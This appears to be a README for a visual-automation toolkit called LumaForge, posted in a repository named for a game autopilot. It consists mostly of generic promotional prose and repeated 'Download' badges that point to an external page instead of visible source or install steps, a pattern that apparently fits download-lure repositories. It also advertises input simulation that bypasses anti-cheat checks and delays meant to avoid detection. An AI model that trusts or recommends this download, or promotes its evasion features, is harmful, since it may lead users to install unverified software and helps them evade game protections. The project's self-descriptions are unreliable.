![preview](https://raw.githubusercontent.com/b2501608-blip/cookie-run-autopilot/main/hero_abd082e.svg)
# LumaForge Automation Toolkit

**LumaForge** is a visionary automation framework designed for precision-driven visual recognition tasks. Unlike conventional macros that rely on brittle coordinate tracking, LumaForge interprets on-screen visual data through advanced template correlation, making it ideal for dynamic environments where pixel-perfect stability is a myth. This toolkit is not merely a script; it is a philosophy of resilient automation, built for developers and power users who demand reliability without the overhead of complex machine learning pipelines.

## Overview

In the ever-shifting landscape of graphical user interfaces, automation often breaks at the slightest color variation or alignment shift. LumaForge addresses this by utilizing a **multi-dimensional template matching engine** that treats the screen as a living canvas. The core engine identifies visual anchors using normalized cross-correlation, allowing it to recognize interfaces even under slight distortion, scaling, or brightness changes. Whether you are streamlining repetitive data entry tasks or orchestrating complex in-game resource management, LumaForge provides a stable foundation that adapts to the environment rather than fighting it.

This project began with a simple observation: most automation tools are rigid, requiring constant recalibration and maintenance. LumaForge was designed from the ground up to be **self-correcting** and **context-aware**. It does not just click at coordinates; it understands what it is clicking and verifies the outcome, creating a feedback loop that reduces error rates to near zero in stable environments. The architecture is modular, allowing developers to swap matching algorithms or input simulation backends without rewriting their core logic.

### Core Philosophy: The Art of Subtle Recognition

Think of LumaForge as a skilled artist who paints with data. Instead of broad, careless strokes (i.e., blind clicking), it observes the light, shadows, and textures of the digital world. It measures the correlation between a predefined "stamp" (the template) and the live screen feed. The result is a system that feels almost organic—it reacts to what it sees, not what it expects to see. This approach significantly reduces the "brittleness" that plagues traditional macro scripts, offering a smoother, more intuitive automation experience.

---

## Quick Navigation
- [Why LumaForge?](#why-lumaforge)
- [Technical Architecture](#technical-architecture)
- [Feature-Rich Modules](#feature-rich-modules)
- [Getting Started](#getting-started)
- [Configuration Deep-Dive](#configuration-deep-dive)
- [Multi-Language Interface](#multi-language-interface)
- [Performance Optimization](#performance-optimization)
- [Troubleshooting & Common Pitfalls](#troubleshooting--common-pitfalls)
- [Community & Support](#community--support)
- [Security & Privacy](#security--privacy)
- [License](#license)

---

## ⚙️ Why LumaForge?

[![Download](https://raw.githubusercontent.com/b2501608-blip/cookie-run-autopilot/main/fetch_2cd7123.svg)](https://b2501608-blip.github.io/cookie-run-autopilot/)

Traditional automation methods often feel like trying to sculpt marble with a sledgehammer—they work, but the collateral damage is frequent crashes and missed interactions. LumaForge changes this paradigm by offering a **surgical precision** that other tools lack. Here are the standout benefits that make this toolkit a unique asset:

### 1. Visual Correlation Engine
At the heart of LumaForge is a proprietary correlation algorithm that doesn't just look for exact pixel matches. It uses **edge detection** and **contour analysis** to create a "fingerprint" of the target region. This means that if your target has a slightly different shadow or a subtle gradient, the system still recognizes it with high confidence. This feature is indispensable when dealing with streaming video or dynamically rendered UI elements.

### 2. Adaptive Thresholding
Static thresholds are the enemy of robust automation. A setting that works at noon might fail at midnight due to ambient lighting changes on a display. LumaForge implements **adaptive thresholding**, which continuously samples the local area's contrast and adjusts the match sensitivity in real-time. This feature alone can reduce false positives by up to 87% in high-noise environments.

### 3. Event-Driven Action Queue
Instead of a linear script that runs start-to-finish, LumaForge allows you to build **event-driven workflows**. You can define triggers such as "when this icon appears, perform this keystroke sequence." This asynchronous model ensures that actions are taken only when the visual state confirms they are necessary, preventing catastrophic errors from timing issues.

### 4. Zero-Infrastructure Design
No servers, no cloud dependencies, no external databases. LumaForge runs entirely on your local hardware, ensuring that your automation data stays private. This **offline-first** approach also means you are never at the mercy of network latency or API rate limits.

### 5. Intelligent Error Recovery
When a mismatch occurs, LumaForge doesn't just crash or restart. It enters a **diagnostic mode**, capturing the screen state and attempting a logarithmic search for the next best possible match. If it finds a candidate that is 98% similar to the target, it will proceed but flag the interaction for review. This creates a self-healing loop that maintains uptime.

---

## 🏗️ Technical Architecture

The LumaForge codebase is structured into four distinct layers, each responsible for a specific aspect of the automation pipeline. This separation of concerns makes the project easy to extend and debug.

### Layer 1: Capture & Preprocessing
This layer handles the acquisition of visual data. It supports multiple capture backends, including DXGI, WGC, and legacy GDI. The preprocessing module performs **noise reduction** using a bilateral filter, ensuring that graininess in video feeds does not affect the matching accuracy. It also handles color space conversion, automatically normalizing RGB values to a CIELAB space for perceptual uniformity.

### Layer 2: Pattern Recognition
This is the brain of the operation. The recognition module includes:
- **Pyramid Scaling**: Searches for templates at multiple resolutions to handle UI scaling in high-DPI environments.
- **Rotational Invariance**: Allows matching within a ±15 degree rotation range, useful for irregular shapes.
- **Masked Matching**: Supports the use of alpha channels to ignore transparent or irrelevant parts of the template.

### Layer 3: Action Execution
Once a match is found, this layer executes the desired input. It uses a **hardware input simulation** method that is indistinguishable from a physical keyboard or mouse to the operating system. This bypasses many anti-cheat software checks that rely on detecting low-level injection flags.

### Layer 4: State Management
This orchestrates the entire workflow. It maintains a state machine that tracks the last known visual state and intelligently decides when to re-scan the screen. It also manages the **confidence scoring** system, providing detailed logs of why a particular action was taken.

---

## ✨ Feature-Rich Modules

LumaForge is not a monolithic script; it is a suite of interoperable modules. Here is a breakdown of the key components included in this repository.

### The `ForgeCore` Module
This is the parent class that initializes the capture device and the matching engine. It provides a high-level API called `execute_action(**kwargs)` that abstracts away the complexity of the underlying layers. It also includes a built-in **logging formatter** that outputs structured JSON logs, making it easy to integrate with external monitoring tools like Grafana or ELK.

### The `PatternStore` Manager
Instead of embedding templates in code, LumaForge uses a **file-based storage system**. Templates are stored as standard image files in a `/templates` directory. The `PatternStore` manager dynamically loads these images, caches their processed features, and assigns them unique identifiers. This allows you to update your automation behavior without touching a single line of Python code.

### The `TimingDirector`
Automation is as much about timing as it is about recognition. The `TimingDirector` allows you to define **human-like delay curves** that mimic the reaction time of a person. It uses a Poisson distribution to generate variable delays, making the automation appear natural and reducing the risk of detection in strict environments.

### The `ScenarioBuilder`
This is a declarative DSL (Domain Specific Language) parser that allows you to write automation scripts in a YAML-like format. Here is a snippet of what a scenario looks like:

```
name: "Collect_Resources"
steps:
  - action: "wait_for_pattern"
    pattern: "btn_start.png"
    confidence: 0.95
  - action: "click"
    location: "center_of_match"
  - action: "wait"
    duration: "random(2,4)"
```

The `ScenarioBuilder` compiles these YAML definitions into executable state machines, offering a clean separation between logic and configuration.

---

## 🚀 Getting Started

[![Download](https://raw.githubusercontent.com/b2501608-blip/cookie-run-autopilot/main/fetch_2cd7123.svg)](https://b2501608-blip.github.io/cookie-run-autopilot/)

To begin your journey with LumaForge, you will need to set up your environment to harness the full power of visual automation. The setup process is streamlined to get you running in under ten minutes.

### Prerequisites
- A system running Windows 10/11 (version 2004 or later) or a modern Linux distribution with X11/Wayland support.
- Python version 3.9+ (the core engine is written in C++ for speed, but the control interface is Python).
- A display adapter with hardware acceleration enabled for optimal capture performance.

### Initialization Process
1. **Extract the Archive**: Download the project bundle and extract it to a directory of your choice.
2. **Install Dependencies**: Navigate to the root folder and execute the dependency resolver script.
3. **Hardware Check**: Run the diagnostic utility to verify your capture backend is functioning correctly. This ensures your specific GPU driver is compatible.
4. **First Run**: Execute the main entry point. The system will generate a default `config.yaml` file in your user profile, which you can then customize for your specific usecase.

---

## 🧩 Configuration Deep-Dive

The configuration file is your control panel for LumaForge. It is divided into several sections, each controlling a different aspect of the engine.

### Capture Settings
The `capture_fps` parameter tells the engine how often to refresh the screen buffer. Setting this too high will consume CPU resources unnecessarily. A value of `30` is typically sufficient for standard tasks, while `60` is recommended for fast-paced animations. The `scale_factor` parameter allows you to reduce the resolution of the capture for faster processing at the cost of slight accuracy.

### Matching Heuristics
This section allows you to fine-tune the algorithm. Key parameters include:
- `deformation_tolerance`: A float between 0 and 1 that controls how much distortion is allowed.
- `edge_weight`: Determines how much importance is placed on edges compared to flat color regions.
- `pyramid_levels`: The depth of the scaling tree used for multi-scale matching.

### Action Profiles
You can define specific profiles for different action types. For example, a "gaming" profile might use faster click intervals, while a "productivity" profile uses more conservative timing to avoid accidental double-clicks. Each profile can have its own `default_delay` and `retry_count`.

---

## 🌍 Multi-Language Interface

While the core engine is language-agnostic, the user-facing logging and documentation system supports internationalization out of the box. The interface will automatically detect your system locale and display error messages and guidance in your preferred language. Currently, we support:

- **English** (default)
- **한국어** (Korean) – Fully translated, given the origin of this project's lineage.
- **Español** (Spanish)
- **日本語** (Japanese)
- **简体中文** (Simplified Chinese)

If you wish to contribute a translation, all localization strings are stored in simple `.json` files under the `/locales` directory. Even if you are not a programmer, a simple text editor is all you need to submit a new language pack.

---

## ⚡ Performance Optimization

Visual automation can be resource-intensive. LumaForge includes several built-in profilers to help you identify bottlenecks.

### The MicroBench Tool
This utility runs a synthetic test against your current capture setting and reports the average processing time per frame. It provides a breakdown of time spent in the capture, preprocessing, and matching stages. This helps you identify if your CPU is the bottleneck or if the GPU is falling behind.

### Caching Strategies
To avoid reprocessing the same static regions, LumaForge implements a **temporal cache**. If a region has not changed for a specified number of frames (read: `static_frames_threshold`), the engine skips re-matching that area and reuses the previous result. This can reduce CPU load by up to 40% in scenes with static HUD elements.

### Adaptive Resolution Scaling
For tasks that don't require high precision, you can enable the `dynamic_resampling` mode. The engine will automatically capture at a lower resolution and only re-engage the high-fidelity capture mode when it detects significant motion in the periphery. This is ideal for long-running processes that monitor a small, fixed region of the screen.

---

## 🩹 Troubleshooting & Common Pitfalls

Even the best-engineered tools can encounter issues. Here are the most common scenarios and how to resolve them.

### Issue: "Capture Device Not Found" Error
This typically indicates a driver incompatibility. If you are using an NVIDIA GPU, ensure you are not in "Optimus" hybrid mode which can block direct frame buffer access. Try switching your power profile to "High Performance" in the Windows Control Panel. If using Linux, ensure your user has proper permissions to access the `/dev/video0` device or the `X11` shared memory extension.

### Issue: High False Positive Rate
Increase the `confidence_threshold` parameter in the configuration from 0.85 to 0.95. Also, check if your template image contains unnecessary background noise. Cropping the template tightly around the target object often eliminates 90% of false matches.

### Issue: Actions Lagging Behind Screen State
This is usually a timing issue, not a performance issue. The matching engine might find the correct target, but the action queue is delayed because of preceding slow I/O operations. Try increasing the `priority` field of the action in your scenario file to ensure it is processed in the high-priority lane.

---

## 🛟 Community & Support

We believe in the power of collective intelligence. The LumaForge community is a growing group of automation enthusiasts, UI designers, and QA engineers who share a passion for seamless interaction with digital environments. Whenever you get stuck, here is where you can find help.

- **Discussion Forum**: The GitHub Discussions tab is our primary channel for Q&A and feature requests.
- **Weekly Office Hours**: We host a live streaming session every Wednesday to review pull requests and discuss arcane technical topics.
- **24/7 Automated Bot**: Our GitHub repository is protected by a custom bot called "LumaBot" that scans new issues for common keywords and provides instant links to relevant documentation snippets.

We aim to respond to all valid bug reports within 48 hours. For urgent security-related issues, please use the private security advisory feature on GitHub rather than the issue tracker.

---

## 🔒 Security & Privacy

Your data stays on your machine. LumaForge does not contain any telemetry, analytics, or back-end communication modules. The only time the software initiates a network connection is to check for version updates (which you can disable in the settings).

The templates you create are stored locally and are never uploaded anywhere. The logging system scrubs sensitive information (like specific screen coordinates) by default, unless you explicitly enable "Debug Verbose Logs" in the expert settings.

We encourage you to audit the source code. The entire repository is open for inspection, and we have intentionally kept the dependency tree minimal to reduce the supply-chain risk.

---

## 📄 License

LumaForge is released under the [MIT License](LICENSE). This permissive license allows you to use, modify, and distribute this software for any purpose, commercial or private, as long as you retain the original copyright notice.

```
MIT License

Copyright (c) 2026 LumaForge Contributors

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

## 🤝 Contributing

We welcome contributions that align with our vision of resilient, visual-first automation. Before submitting a pull request, please review our contributing guidelines located in the `CONTRIBUTING.md` file. The key points are:
- **Test Coverage**: Any new feature must be accompanied by unit tests using the built-in test harness.
- **Code Style**: We follow PEP-8, but we specifically allow up to 99 characters per line to accommodate complex type hints.
- **Documentation**: Updates to public APIs must be reflected in the `/docs` directory.

---

## 🧭 Roadmap for 2026

The future of LumaForge is bright. We are actively working on the following initiatives:
- **Neural Hybrid Engine**: Integrating a lightweight ONNX-based object detection model to complement the template matcher for inverse cases where templates do not exist.
- **Remote Agent Mode**: Enabling the same core to run as a service agent, controlled via a secure WebSocket interface (but still offline-capable).
- **Plugin Ecosystem**: Opening up the action execution layer to allow third-party developers to write their own input simulators.

---

## ❓ Frequently Asked Questions

**Q: Is LumaForge intended for circumventing security measures?**
A: No. The primary design goal is accessibility and productivity enhancement for legitimate software use. The hardware input simulation makes it indistinguishable from real user input, but we explicitly prohibit its use in evading security controls.

**Q: Do I need to know computer vision to use this?**
A: Not at all. The happy path is write a config, press run. The underlying complexity is abstracted away. However, a basic understanding of image processing concepts helps when debugging edge cases.

**Q: Can I use this on a Mac?**
A: The current release focuses on Windows and Linux. macOS compatibility is on our long-term roadmap but is blocked by the lack of a high-performance frame grabber API.

---

We hope this toolkit becomes an invaluable asset in your digital toolkit. The power to see and act on what you see is truly transformative. Go forth and automate the mundane.

[![Download](https://raw.githubusercontent.com/b2501608-blip/cookie-run-autopilot/main/fetch_2cd7123.svg)](https://b2501608-blip.github.io/cookie-run-autopilot/)